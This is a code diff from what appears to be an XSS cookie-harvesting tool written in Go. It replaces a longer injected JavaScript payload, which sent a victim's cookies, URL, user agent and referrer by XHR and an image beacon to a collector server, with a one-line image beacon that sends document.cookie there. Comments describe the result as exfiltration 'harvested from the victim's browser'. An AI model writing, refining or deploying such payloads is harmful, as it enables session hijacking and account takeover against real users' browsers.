@@ -139,32 +139,17 @@ func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, r *http.Request, to
 }
 
 // renderCollectorJS builds the JavaScript payload for a given XSS payload token.
+// Minimal: just exfiltrate document.cookie via an image beacon to the GIF
+// endpoint. ~75 bytes vs ~600 in the previous XHR+beacon version.
+// The collector returns a 1x1 transparent GIF so the browser handles the
+// response without any visible side-effect.
 func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
 	publicURL := strings.TrimRight(h.cfg.PublicURL, "/")
 	if publicURL == "" {
 		publicURL = "http://" + h.cfg.BindHost
 	}
-	return fmt.Sprintf(`(function(){
-var payloadToken=%q;
-function sendCapture(data){
-  var cs=new XMLHttpRequest();
-  try{
-    cs.open("POST","%s/xss/"+payloadToken+"/capture",true);
-    cs.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-    var body="cookie="+encodeURIComponent(document.cookie);
-    body+="&url="+encodeURIComponent(location.href);
-    body+="&user_agent="+encodeURIComponent(navigator.userAgent);
-    body+="&document_referrer="+encodeURIComponent(document.referrer);
-    cs.send(body);
-  }catch(e){}
-}
-var collectFunc=function(){
-  var img=new Image();
-  img.src="%s/xss/"+payloadToken+".gif?cookie="+encodeURIComponent(document.cookie)+"&url="+encodeURIComponent(location.href)+"&ua="+encodeURIComponent(navigator.userAgent)+"&t=Math.random()";
-};
-if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",collectFunc);}
-else{collectFunc();}
-})();`, payload.Token, publicURL, publicURL)
+	return fmt.Sprintf(`(new Image()).src="%s/xss/%s.gif?cookie="+encodeURIComponent(document.cookie)`,
+		publicURL, payload.Token)
 }
 
 // Capture receives cookie data harvested from the victim's browser.
